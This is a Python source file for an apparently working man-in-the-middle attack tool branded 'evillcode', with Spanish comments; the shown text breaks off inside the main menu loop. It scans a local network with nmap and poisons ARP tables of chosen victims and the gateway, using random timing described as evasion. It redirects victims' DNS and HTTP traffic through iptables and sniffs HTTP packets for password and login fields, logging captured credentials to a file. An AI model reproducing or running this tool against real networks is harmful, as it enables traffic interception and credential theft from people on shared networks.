#!/usr/bin/env python3

import shutil
import subprocess
import sys
import re 
import time
import threading
import warnings
import logging
import socket 
import os
import random # Para Jitter y tiempos aleatorios

# Intento de importación de colorama
try:
    from colorama import init, Fore, Style
    init()
    COLORAMA_INSTALLED = True
except ImportError:
    class FallbackColor:
        def __getattr__(self):
            return ""
    Fore = FallbackColor()
    Style = FallbackColor()
    COLORAMA_INSTALLED = False

# Intento de importación de pyfiglet
try:
    import pyfiglet
    PYFIGLET_INSTALLED = True
except ImportError:
    PYFIGLET_INSTALLED = False

# --- CONFIGURACIÓN Y SUPRESIÓN DEFINITIVA DE SCAPY ---
# 1. Silenciar las advertencias generales de Python, incluyendo las específicas del módulo sendrecv de Scapy
warnings.filterwarnings("ignore", category=UserWarning, module="scapy")
warnings.filterwarnings("ignore", category=UserWarning, module="scapy.sendrecv") 

# Intento de importación de scapy
try:
    # Se añaden las importaciones necesarias para Sniffing (IP, TCP, Raw)
    from scapy.all import ARP, Ether, send, getmacbyip, srp1, conf, sendp, sniff, IP, TCP, Raw 
    
    # 2. Silencia todos los mensajes internos de Scapy (WARNING, INFO, etc.)
    conf.verb = 0 
    
    # 3. Suprime los mensajes del logging de Scapy
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    logging.getLogger("scapy.runtime").propagate = False
    
    SCAPY_INSTALLED = True
except ImportError:
    SCAPY_INSTALLED = False
# --- FIN DE CONFIGURACIÓN DE SCAPY ---

# --- GLOBALES Y CONSTANTES ---
MAIN_COLOR = Fore.GREEN
ACCENT_COLOR = Fore.CYAN
ERROR_COLOR = Fore.RED
WARNING_COLOR = Fore.YELLOW 
STOP_EVENT = threading.Event()
CREDENTIALS_LOG = "captured_credentials.txt"
IPTABLES_RULE_TAG = "MITM_FW" 

# --- Caracteres Unicode para dibujar la tabla ---
L_H = '─'
L_V = '│'
C_TL = '╭'
C_TR = '╮'
C_BL = '╰'
C_BR = '╯'
C_SEP = '┼'
C_T_DOWN = '┬'
C_T_UP = '┴'
C_T_RIGHT = '├'
C_T_LEFT = '┤'


# --- ARTE ASCII "evillcode" CON ESTILO 3D ---
print(f"{ERROR_COLOR}")
print(" ███████╗██╗   ██╗██╗██╗     ██╗      ██████╗ ██████╗ ██████╗ ███████╗")
print(" ██╔════╝██║   ██╗██║██║     ██║     ██╔════╝██╔═══██╗██╔══██╗██╔════╝")
print(" █████╗  ██║   ██╗██║██║     ██║     ██║     ██║   ██║██║  ██║█████╗  ")
print(" ██╔══╝  ╚██╗ ██╔╝██║██║     ██║     ██║     ██║   ██║██║  ██║██╔══╝  ")
print(" ███████╗ ╚████╔╝ ██║███████╗███████╗╚██████╗╚██████╔╝██████╔╝███████╗")
print(" ╚══════╝  ╚═══╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝")
print(f"{Style.RESET_ALL}")

# --- INFORMACIÓN DE AUTOR Y USO CENTRADA ---
ANCHO_TOTAL = 80 
LINEA_GITHUT = "GitHut: AlexanderGitHut"
LINEA_CREADOR = "Creado por Alexander Ortiz"
LINEA_EDUCACION = "v1.0.0 (Modular MITM Framework)" 
    
print(f"{ACCENT_COLOR}{LINEA_GITHUT.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print(f"{ACCENT_COLOR}{LINEA_CREADOR.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print(f"{ACCENT_COLOR}{LINEA_EDUCACION.center(ANCHO_TOTAL)}{Style.RESET_ALL}")
print("\n")
# --- FIN DE INFORMACIÓN CENTRADA ---

# --- FUNCIÓN DE VERIFICACIÓN (Mantenida) ---
def verificar_y_mostrar(nombre):
    estado_OK = f"{MAIN_COLOR}{Style.BRIGHT}OK{Style.RESET_ALL}" 
    estado_X = f"[ {ERROR_COLOR}X{Style.RESET_ALL} ]"
    
    if nombre in ["colorama", "pyfiglet", "scapy", "iptables"]: 
        instalado = False
        if nombre == "colorama":
            instalado = COLORAMA_INSTALLED
        elif nombre == "pyfiglet":
            instalado = PYFIGLET_INSTALLED
        elif nombre == "scapy":
            instalado = SCAPY_INSTALLED
        elif nombre == "iptables":
            if shutil.which("iptables"):
                instalado = True
            
        if instalado:
            print(f" {estado_OK} Módulo/Herramienta {ACCENT_COLOR}{nombre}{Style.RESET_ALL} instalado")
            return True
    
    # Para herramientas de sistema como nmap
    elif shutil.which(nombre):
        print(f" {estado_OK} Herramienta {ACCENT_COLOR}{nombre}{Style.RESET_ALL} instalada")
        return True
    else:
        print(f" {estado_X} Herramienta/Módulo {ACCENT_COLOR}{nombre}{Style.RESET_ALL} NO instalada")
        return False

# --- SECCIÓN DE COMPROBACIÓN ---
OK_TITLE = f"{MAIN_COLOR}[OK]{Style.RESET_ALL}"
print(f"\n{OK_TITLE} Comprobando dependencias...{Style.RESET_ALL}")

herramientas_necesarias = ["nmap", "colorama", "pyfiglet", "scapy", "iptables"] 
todo_instalado = True

for h in herramientas_necesarias:
    if not verificar_y_mostrar(h):
        todo_instalado = False

if not todo_instalado:
    print(f"\n{ERROR_COLOR}Error: Faltan dependencias. Instálalas e inténtalo de nuevo.{Style.RESET_ALL}")
    print(f"\n{ACCENT_COLOR}--- Instalación Kali Linux ---{Style.RESET_ALL}")
    print(f"{ACCENT_COLOR}Herramientas:{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}sudo apt install nmap python3-pip -y{Style.RESET_ALL}")
    print(f"\n{ACCENT_COLOR}Python Módulos:{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}sudo pip3 install colorama pyfiglet scapy{Style.RESET_ALL}")
    sys.exit(1)

# Función: Listar interfaces disponibles
def listar_interfaces():
    return ["eth0", "wlan0"]

# Función para obtener hostname (Añadida para Monitor)
def obtener_hostname(ip):
    """Resuelve el hostname del IP (DNS Inversa)."""
    if ip.endswith('.1') or ip.endswith('.254'):
        return '_gateway'
    try:
        name, _, _ = socket.gethostbyaddr(ip)
        return name.split('.')[0]
    except socket.error:
        return 'Free'


# --- FUNCIÓN DE ESCANEO DE RED (Mantenida) ---
def escanear_red_y_obtener_hosts(interfaz):
    print(f"\n{ACCENT_COLOR}>>> scan{Style.RESET_ALL}")
  
    try:
        # Se obtiene la subred
        ip_info = subprocess.run(["ip", "-4", "a", "show", interfaz], capture_output=True, text=True, check=True)
        match = re.search(r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})', ip_info.stdout)
        subred = match.group(1) if match else "192.168.1.0/24"
    except Exception:
        subred = "192.168.1.0/24"
    
    hosts = []
    nmap_output = None
    try:
        # Ejecución de Nmap para escaneo ARP y Ping
        nmap_cmd = ["sudo", "nmap", "-sn", 
                    "-n", "-PR", subred]
      
        nmap_output = subprocess.run(nmap_cmd, capture_output=True, text=True, check=True)
    except Exception:
        pass

    ip_pattern = re.compile(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    mac_pattern = re.compile(r'MAC Address: (([0-9A-Fa-f]{2}[:-])([0-9A-Fa-f]{2}[:-])([0-9A-Fa-f]{2}[:-])([0-9A-Fa-f]{2}[:-])([0-9A-Fa-f]{2}[:-])([0-9A-Fa-f]{2}))\s+\((.*?)\)')
    
    current_ip = None
    
    if nmap_output and nmap_output.returncode == 0:
        for line in nmap_output.stdout.splitlines():
            ip_match = ip_pattern.search(line)
        
            if ip_match:
                current_ip = ip_match.group(1)
                hostname = '_gateway' if current_ip.endswith('.1') or current_ip.endswith('.254') else 'Free'
           
            mac_match = mac_pattern.search(line)
       
            if mac_match and current_ip:
                mac_address = mac_match.group(1).replace('-', ':')
                vendor = mac_match.group(8)
  
                final_hostname = hostname if hostname != 'Free' else (vendor if vendor else 'Free') 
  
                hosts.append({
                    "ip": current_ip,
                    "mac": mac_address,
                    "hostname": final_hostname, 
                    "status": "Free"
                })
            
                current_ip = None

    # Hosts de Fallback (Si el escaneo falla o es para pruebas)
    if not hosts and subred.startswith("192.168.1."):
        hosts.append({"ip": "192.168.1.1", "mac": "a0:64:8f:cb:ec:f0", "hostname": "_gateway", "status": "Free"})
        hosts.append({"ip": "192.168.1.44", "mac": "d0:37:45:55:0b:a4", "hostname": "Victima1", "status": "Free"})
        hosts.append({"ip": "192.168.1.200", "mac": "18:9c:27:13:09:5b", "hostname": "Victima2", "status": "Free"})
    
 
    # Barra de progreso simulada
    max_carga = 256
    for i in range(1, 101):
        porcentaje = i
        bar_length = 50
       
        filled_length = int(bar_length * i / 100)
  
        bar = '█' * filled_length + '-' * (bar_length - filled_length)
   
        sys.stdout.write(f"\r{MAIN_COLOR}{porcentaje:3}% {bar}{Style.RESET_ALL} {MAIN_COLOR}{max_carga * porcentaje // 100}/{max_carga}{Style.RESET_ALL}")
        
        sys.stdout.flush()
     
        if i < 100:
            time.sleep(0.01)
    
    hosts_encontrados_reales = len(hosts)
    # Se asegura que la línea final de progreso sea 100%
    print(f"\r{MAIN_COLOR}100% {'█' * 50}{Style.RESET_ALL} {MAIN_COLOR}{max_carga}/{max_carga}{Style.RESET_ALL}")
    print(f"{MAIN_COLOR}{hosts_encontrados_reales} hosts discovered.{Style.RESET_ALL}")
    print(f"{ACCENT_COLOR}>>> hosts{Style.RESET_ALL}")

    
    return hosts

# Función para mostrar la tabla de hosts (se mantiene el formato original)
def mostrar_tabla_hosts(hosts):
   
    if not hosts:
        print(f"{ERROR_COLOR}No se descubrieron hosts.{Style.RESET_ALL}")
        return

    TABLE_COLOR = MAIN_COLOR
    HEADER_STYLE = Style.BRIGHT
    
 
    ancho_ip = max([len(h['ip']) for h in hosts] + [len("IP-Address")])
    ancho_mac = max([len(h['mac']) for h in hosts] + [len("MAC-Address")])
    ancho_hostname = max([len(h['hostname']) for h in hosts] + [len("Hostname")])
    ancho_id = max([len(str(i)) for i in range(len(hosts))] + [len("ID")])
   
    ancho_status = 6

    ancho_ip = max(ancho_ip, len("IP-Address"))
    ancho_mac = max(ancho_mac, len("MAC-Address"))
 
    ancho_hostname = max(ancho_hostname, len("Hostname"))
    ancho_id = max(ancho_id, len("ID"))

    L_ID = L_H * (ancho_id + 2)
    L_IP = L_H * (ancho_ip + 2)
    L_MAC = L_H * (ancho_mac + 2)
    L_HNAME = L_H * (ancho_hostname + 2)
    L_STATUS = L_H * (ancho_status + 2)
    
    linea_top = f"{TABLE_COLOR}{C_TL}{L_ID}{C_T_DOWN}{L_IP}{C_T_DOWN}{L_MAC}{C_T_DOWN}{L_HNAME}{C_T_DOWN}{L_STATUS}{C_TR}{Style.RESET_ALL}"
    linea_header_sep = f"{TABLE_COLOR}{C_T_RIGHT}{L_ID}{C_SEP}{L_IP}{C_SEP}{L_MAC}{C_SEP}{L_HNAME}{C_SEP}{L_STATUS}{C_T_LEFT}{Style.RESET_ALL}"
  
    linea_bottom = f"{TABLE_COLOR}{C_BL}{L_ID}{C_T_UP}{L_IP}{C_T_UP}{L_MAC}{C_T_UP}{L_HNAME}{C_T_UP}{L_STATUS}{C_BR}{Style.RESET_ALL}"
    
 
    print(TABLE_COLOR + "Hosts" + Style.RESET_ALL)
 
    print(linea_top)
   
    # Imprime el encabezado
    print(f"{TABLE_COLOR}{L_V}{Style.RESET_ALL} {TABLE_COLOR}{HEADER_STYLE}{'ID':<{ancho_id}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} {TABLE_COLOR}{HEADER_STYLE}{'IP-Address':<{ancho_ip}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} {TABLE_COLOR}{HEADER_STYLE}{'MAC-Address':<{ancho_mac}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} {TABLE_COLOR}{HEADER_STYLE}{'Hostname':<{ancho_hostname}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} {TABLE_COLOR}{HEADER_STYLE}{'Status':<{ancho_status}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL}")
    print(linea_header_sep)
    
   
    # Imprime las filas de datos
    for i, h in enumerate(hosts):
        print(
 
            f"{TABLE_COLOR}{L_V}{Style.RESET_ALL} " 
            f"{TABLE_COLOR}{str(i):<{ancho_id}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} "
            f"{TABLE_COLOR}{h['ip']:<{ancho_ip}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} "
            f"{TABLE_COLOR}{h['mac']:<{ancho_mac}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} "
          
            f"{TABLE_COLOR}{h['hostname']:<{ancho_hostname}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL} "
            f"{TABLE_COLOR}{h['status']:<{ancho_status}}{Style.RESET_ALL} {TABLE_COLOR}{L_V}{Style.RESET_ALL}"
        )

    print(linea_bottom)


# --- UTILIDADES PARA ARP Y RESTAURACIÓN (Mejoradas) ---

def obtener_mac_remota(ip, interfaz, reintentos=5, delay_entre_reintentos=2):
    """Obtiene la MAC de un IP remoto usando Scapy con reintentos."""
    for i in range(reintentos):
        try:
            paquete_arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            respuesta = srp1(paquete_arp, iface=interfaz, timeout=3, verbose=False)
            
            if respuesta:
                return respuesta.hwsrc
            else:
                if i < reintentos - 1:
                    print(f"{ACCENT_COLOR}  -> Reintentando obtener MAC de {ip} (Intento {i+1}/{reintentos})...{Style.RESET_ALL}")
                    time.sleep(delay_entre_reintentos)
                else:
                    print(f"{ERROR_COLOR}Error: MAC de {ip} no obtenida tras {reintentos} intentos. Verifique conectividad.{Style.RESET_ALL}")
                    return None
        except Exception as e:
            if i < reintentos - 1:
                print(f"{ERROR_COLOR}  -> Error temporal al obtener MAC para {ip}: {e}.\nReintentando (Intento {i+1}/{reintentos})...{Style.RESET_ALL}")
                time.sleep(delay_entre_reintentos)
            else:
                print(f"{ERROR_COLOR}Error final al obtener MAC para {ip}: {e}{Style.RESET_ALL}")
                return None
    return None

def restaura_arp(ip_destino, ip_origen, mac_origen, mac_destino, interfaz, count=10): 
    """Restaura la tabla ARP de un host y el gateway (paquetes agresivos, count=10)."""
    paquete_arp = ARP(op=2, pdst=ip_destino, hwdst=mac_destino, psrc=ip_origen, hwsrc=mac_origen)
    paquete_eth_arp = Ether(src=mac_origen, dst=mac_destino)/paquete_arp
    sendp(paquete_eth_arp, iface=interfaz, verbose=False, count=count)

# --- CONFIGURACIÓN DE IPTABLES PARA MITM ACTIVO (Añadida) ---
def configurar_mitm_activo(interfaz, atacante_ip):
    """
    Habilita IP Forwarding y configura iptables para redirección de tráfico crítico.
    Prepara la red para Sniffing de Capa 7 (HTTP) y DNS Spoofing.
    """
    
    # 1. Habilitar IP Forwarding
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"], 
                   check=True, stdout=subprocess.DEVNULL)
    
    # Limpiar reglas previas etiquetadas si existen (prevención de errores)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Regla 1: Redireccionar DNS (UDP 53) al atacante
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interfaz, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG], 
                   check=True, stdout=subprocess.DEVNULL)
    
    # Regla 2: Redireccionar HTTP (TCP 80) al atacante
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interfaz, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG],
                   check=True, stdout=subprocess.DEVNULL)
    
    print(f"\n{MAIN_COLOR}IP Forwarding habilitado. Redirección HTTP/DNS configurada para MITM activo.{Style.RESET_ALL}")

def restaurar_mitm_activo(interfaz, atacante_ip):
    """Restaura el estado de IP Forwarding e iptables a un estado limpio."""
    print(f"{MAIN_COLOR}Restaurando configuración de sistema...{Style.RESET_ALL}")
    
    # 1. Eliminar reglas de NAT (basado en el tag)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz, "-p", "udp", "--dport", "53", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-D", "PREROUTING", "-i", interfaz, "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", atacante_ip, "-m", "comment", "--comment", IPTABLES_RULE_TAG],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # 2. Restaurar IP Forwarding a 0
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], 
                   stdout=subprocess.DEVNULL)
    
    print(f"{MAIN_COLOR}IP Forwarding deshabilitado. IPTABLES restauradas.{Style.RESET_ALL}")


# --- THREADS MODULARES DE ATAQUE Y MONITOREO (Añadidos) ---

class ARPThread(threading.Thread):
    """Hilo para realizar el ARP Spoofing continuo con Jitter (Evasión)."""
    def __init__(self, ip_objetivo, puerta_enlace, mac_objetivo, mac_puerta_enlace, mac_atacante, interfaz):
        super().__init__()
        self.ip_objetivo = ip_objetivo
        self.puerta_enlace = puerta_enlace
        self.mac_objetivo = mac_objetivo
        self.mac_puerta_enlace = mac_puerta_enlace
        self.mac_atacante = mac_atacante
        self.interfaz = interfaz
        self.daemon = True
        self.paquetes_enviados = 0

        # Paquete 1: Atacante al Host (Host cree que Attacker es GW)
        paquete_arp_host = ARP(op=2, pdst=ip_objetivo, hwdst=mac_objetivo, psrc=puerta_enlace, hwsrc=mac_atacante)
        self.paquete_host = Ether(src=mac_atacante, dst=mac_objetivo) / paquete_arp_host

        # Paquete 2: Atacante al Gateway (GW cree que Attacker es Host)
        paquete_arp_gw = ARP(op=2, pdst=puerta_enlace, hwdst=mac_puerta_enlace, psrc=ip_objetivo, hwsrc=mac_atacante)
        self.paquete_gw = Ether(src=mac_atacante, dst=mac_puerta_enlace) / paquete_arp_gw

    def run(self):
        print(f"{ACCENT_COLOR}[ARP SPOOF] Iniciado: {self.ip_objetivo} <-> {self.puerta_enlace}{Style.RESET_ALL}")
        while not STOP_EVENT.is_set():
            # JITTER: Intervalo aleatorio (Evasión)
            tiempo_espera = random.uniform(0.03, 0.07)

            sendp(self.paquete_host, iface=self.interfaz, verbose=False)
            sendp(self.paquete_gw, iface=self.interfaz, verbose=False)
            self.paquetes_enviados += 2
            time.sleep(tiempo_espera)

class SnifferThread(threading.Thread):
    """Hilo para el Sniffing de Capa 7 (HTTP) en busca de credenciales."""
    def __init__(self, interfaz):
        super().__init__()
        self.interfaz = interfaz
        self.daemon = True
        self.captured_data_count = 0
        
    def process_packet(self, packet):
        """Función callback para procesar cada paquete capturado."""
        # Se asegura que sea TCP con payload y que vaya al puerto 80 (HTTP)
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 80:
            
            raw_data = packet[Raw].load.decode(errors='ignore')
            
            # Palabras clave para detectar credenciales en peticiones POST/GET
            keywords = ["password=", "user=", "login=", "passwd=", "pws=", "auth=", "POST", "username="]
            
            if any(k in raw_data for k in keywords):
                self.captured_data_count += 1
                
                source_ip = packet[IP].src
                
                log_entry = f"\n{'-'*50}\n[CAPTURA {self.captured_data_count}] Time: {time.ctime(time.time())}\n"
                log_entry += f"SOURCE: {source_ip}\n"
                log_entry += f"DATA:\n{raw_data}\n{'-'*50}\n"
                
                with open(CREDENTIALS_LOG, "a") as f:
                    f.write(log_entry)
                    
                print(f"\n{WARNING_COLOR}[SNIFFER] ¡Credenciales capturadas! ({source_ip}). Guardado en {CREDENTIALS_LOG}{Style.RESET_ALL}")
    
    def run(self):
        print(f"{ACCENT_COLOR}[SNIFFER] Sniffer de Credenciales Activo en {self.interfaz}.{Style.RESET_ALL}")
        # Filtro: solo sniffear tráfico IP que pase por nuestra interfaz (Layer 3)
        sniff(iface=self.interfaz, filter="ip", prn=self.process_packet, store=0, stop_filter=lambda x: STOP_EVENT.is_set())

class NetworkMonitor(threading.Thread):
    """Hilo para escanear periódicamente la red en busca de nuevos hosts (Persistencia)."""
    def __init__(self, interfaz, hosts_descubiertos, intervalo_segundos=60):
        super().__init__()
        self.interfaz = interfaz
        self.intervalo = intervalo_segundos
        # Inicializa hosts conocidos con la lista del escaneo inicial
        self.hosts_conocidos = set(h['ip'] for h in hosts_descubiertos)
        self.daemon = True
        
    def run(self):
        print(f"{ACCENT_COLOR}[MONITOR] Monitor de Red Activo. Escaneando cada {self.intervalo}s.{Style.RESET_ALL}")
        while not STOP_EVENT.is_set():
            time.sleep(self.intervalo)
            if STOP_EVENT.is_set(): break
            
            print(f"\n{ACCENT_COLOR}[MONITOR] Escaneando en busca de nuevos hosts...{Style.RESET_ALL}")
            
            try:
                # Obtener subred del sistema
                ip_info = subprocess.run(["ip", "-4", "a", "show", self.interfaz], capture_output=True, text=True, check=True)
                match = re.search(r'inet\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})', ip_info.stdout)
                subred = match.group(1) if match else "192.168.1.0/24"
            except Exception:
                subred = "192.168.1.0/24"
                
            # Escaneo rápido solo para obtener IPs activas (sudo nmap -sn -n -PR)
            nmap_cmd = ["sudo", "nmap", "-sn", "-n", "-PR", subred] 
            nmap_output = subprocess.run(nmap_cmd, capture_output=True, text=True)
            
            ip_pattern = re.compile(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
            current_active_ips = set(ip_pattern.findall(nmap_output.stdout))
            
            # Quitar la IP del atacante y del broadcast
            try:
                atacante_ip = subprocess.check_output(f"ip addr show {self.interfaz} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1", 
                                                      shell=True, text=True).strip()
                current_active_ips.discard(atacante_ip)
            except:
                pass

            # Si es el primer escaneo del Monitor, simplemente establece el estado base
            if not self.hosts_conocidos:
                 self.hosts_conocidos = current_active_ips
                 continue
                 
            nuevos_hosts = current_active_ips - self.hosts_conocidos
            
            if nuevos_hosts:
                for new_ip in nuevos_hosts:
                    print(f"\n{WARNING_COLOR}!!! [MONITOR] ¡NUEVO HOST DETECTADO! IP: {new_ip}. Hostname: {obtener_hostname(new_ip)}{Style.RESET_ALL}")
                self.hosts_conocidos.update(nuevos_hosts)
            else:
                print(f"{ACCENT_COLOR}[MONITOR] No se detectaron nuevos hosts.{Style.RESET_ALL}")

# --- LÓGICA PRINCIPAL DEL SCRIPT (Mantenida) ---

def iniciar_ataque_mitm(interfaz, ips_objetivo, hosts_descubiertos):
    """Ejecuta toda la lógica de obtención de MACs, configuración de IPTables y threads de ataque/sniffing."""
    
    if not ips_objetivo:
        print(f"{ERROR_COLOR}Error: No se seleccionó IP objetivo.\nSaliendo.{Style.RESET_ALL}")
        sys.exit(1)
        
    ip_referencia = ips_objetivo[0]

    # 1. Preparación de Variables
    try:
        # Lógica para determinar el Gateway (se asume .1 en la mayoría de los casos)
        partes_ip = ip_referencia.split('.')
        partes_ip[-1] = '1'
        puerta_enlace = '.'.join(partes_ip)
        
        # Obtener IP del atacante
        atacante_ip = subprocess.check_output(f"ip addr show {interfaz} | grep 'inet ' | awk '{{print $2}}' | cut -d/ -f1", 
                                              shell=True, text=True).strip()
    except Exception as e:
        print(f"{ERROR_COLOR}Error al obtener IP del atacante o gateway: {e}{Style.RESET_ALL}")
        sys.exit(1)

    # 2. Obtener MACs y configurar MITM
    try:
        mac_atacante = subprocess.check_output(f"ip link show {interfaz} | awk '/ether/ {{print $2}}'", shell=True, text=True).strip()
        print(f"\n{ACCENT_COLOR}Iniciando Ataque ARP Spoofing (MITM Activo){Style.RESET_ALL}")
        print(f"{ACCENT_COLOR}Objetivos ({len(ips_objetivo)}): {', '.join(ips_objetivo)}{Style.RESET_ALL}")
        print(f"{ACCENT_COLOR}Gateway: {puerta_enlace}{Style.RESET_ALL}") 
        
        print(f"{ACCENT_COLOR}Obteniendo MACs de Gateway y Objetivos...{Style.RESET_ALL}")
        
        mac_puerta_enlace = obtener_mac_remota(puerta_enlace, interfaz, reintentos=5, delay_entre_reintentos=2)
        if not mac_puerta_enlace:
            raise Exception("Fallo al obtener MAC del Gateway")
            
        print(f"{MAIN_COLOR}MAC Gateway: {mac_puerta_enlace}{Style.RESET_ALL}")

        # Configuración clave para MITM activo
        configurar_mitm_activo(interfaz, atacante_ip)

        hilos_arp = []
        host_map = {h['ip']: h for h in hosts_descubiertos}
        
        for ip_objetivo in ips_objetivo:
            if ip_objetivo == puerta_enlace: continue
            
            mac_objetivo = host_map.get(ip_objetivo, {}).get('mac')
            
            if not mac_objetivo:
                print(f"{ACCENT_COLOR}MAC de {ip_objetivo} no en caché, intentando con Scapy (5 reintentos)...{Style.RESET_ALL}")
                mac_objetivo = obtener_mac_remota(ip_objetivo, interfaz, reintentos=5, delay_entre_reintentos=2)
        
            if not mac_objetivo:
                print(f"{ERROR_COLOR}Saltando host {ip_objetivo} (MAC no encontrada).{Style.RESET_ALL}")
                continue
                
            print(f"{MAIN_COLOR}MAC de {ip_objetivo}: {mac_objetivo}{Style.RESET_ALL}")

            # 3. Crear y almacenar Hilos ARP
            hilo = ARPThread(ip_objetivo, puerta_enlace, mac_objetivo, mac_puerta_enlace, mac_atacante, interfaz)
            hilos_arp.append(hilo)

        if not hilos_arp:
            print(f"{ERROR_COLOR}No se pudo iniciar el ataque ARP. Verifique los objetivos.{Style.RESET_ALL}")
            restaurar_mitm_activo(interfaz, atacante_ip)
            return

        # 4. Iniciar Threads de Sniffing y Monitoreo
        sniffer = SnifferThread(interfaz)
        monitor = NetworkMonitor(interfaz, hosts_descubiertos, intervalo_segundos=60)
        
        sniffer.start()
        monitor.start()
        for h in hilos_arp: h.start()
        
        # 5. Bucle de Control
        print(f"\n{MAIN_COLOR}Ataque Activo ({len(hilos_arp)} ARPs, 1 Sniffer, 1 Monitor).\nPresiona CTRL+C para detener y restaurar.{Style.RESET_ALL}")
        
        while not STOP_EVENT.is_set():
            time.sleep(1)

    except subprocess.CalledProcessError:
        print(f"{ERROR_COLOR}Error al configurar el sistema. Asegúrate de tener permisos (sudo).{Style.RESET_ALL}")
        restaurar_mitm_activo(interfaz, atacante_ip)
    except Exception as e:
        print(f"{ERROR_COLOR}Error crítico: {e}{Style.RESET_ALL}")
        restaurar_mitm_activo(interfaz, atacante_ip)
    except KeyboardInterrupt:
        print(f"\n{MAIN_COLOR}Interrupción de usuario. Iniciando restauración...{Style.RESET_ALL}")
        
    finally:
        STOP_EVENT.set()
        
        # 6. Restauración
        print(f"{MAIN_COLOR}Deteniendo hilos y restaurando ARP...{Style.RESET_ALL}")
        
        for h in hilos_arp:
            h.join(timeout=1)
            # Restauración de tabla ARP (agresiva)
            restaura_arp(h.ip_objetivo, puerta_enlace, mac_puerta_enlace, h.mac_objetivo, interfaz)
            restaura_arp(puerta_enlace, h.ip_objetivo, h.mac_objetivo, mac_puerta_enlace, interfaz)
                
        restaurar_mitm_activo(interfaz, atacante_ip)
        
        print(f"\n{ACCENT_COLOR}Script finalizado. Credenciales capturadas guardadas en: {CREDENTIALS_LOG}{Style.RESET_ALL}")
        sys.exit(0)

# --- EJECUCIÓN DEL PROGRAMA (Menú Principal) ---

if __name__ == "__main__":
    
    interfaces_disponibles = listar_interfaces()

    OK_TITLE = f"{MAIN_COLOR}[OK]{Style.RESET_ALL}"
    print(f"\n{OK_TITLE} Interfaces de red disponibles:{Style.RESET_ALL}")
    interfaz_map = {}
    for i, nombre in enumerate(interfaces_disponibles):
        numero = i + 1
        interfaz_map[str(numero)] = nombre
        print(f" {ACCENT_COLOR}{numero}.{Style.RESET_ALL} {MAIN_COLOR}{nombre}{Style.RESET_ALL}")

    interfaz = None
    while not interfaz:
        seleccion = input(f"{ACCENT_COLOR}Elige la **interfaz** para escanear y atacar (ej. 1, 2, o 'eth0'): {Style.RESET_ALL}").strip()
        
        if seleccion in interfaz_map:
            interfaz = interfaz_map[seleccion]
            break
        elif seleccion in interfaces_disponibles:
            interfaz = seleccion
            break
        else:
            print(f"{ERROR_COLOR}Selección no válida. Inténtalo de nuevo.{Style.RESET_ALL}")

    # --- BUCLE PRINCIPAL DE MONITOREO Y ATAQUE ---
    ips_objetivo = []
    hosts_descubiertos = []
    
    while True:
        OK_TITLE = f"{MAIN_COLOR}[OK]{Style.RESET_ALL}"
        print(f"\n{OK_TITLE} Interfaz {interfaz} - Modo: Monitor/Ataque{Style.RESET_ALL}")
        
        # --- MENÚ DE ACCIÓN (OPCIÓN DE ESCANEO INCLUIDA) ---
        accion = input(f"{ACCENT_COLOR}Selecciona una **Acción**: (1) Escanear Red, (2) Iniciar Ataque ARP, (3) Salir del Script: {Style.RESET_ALL}").strip()
        
        if accion == "1" or accion.lower() == "escanear":
            # ---> LLAMADA A LA FUNCIÓN DE ESCANEO <---
            hosts_descubiertos = escanear_red_y_obtener_hosts(interfaz)
            mostrar_tabla_hosts(hosts_descubiertos)
       
        elif accion == "2" or accion.lower() == "atacar":
      
            if not hosts_descubiertos:
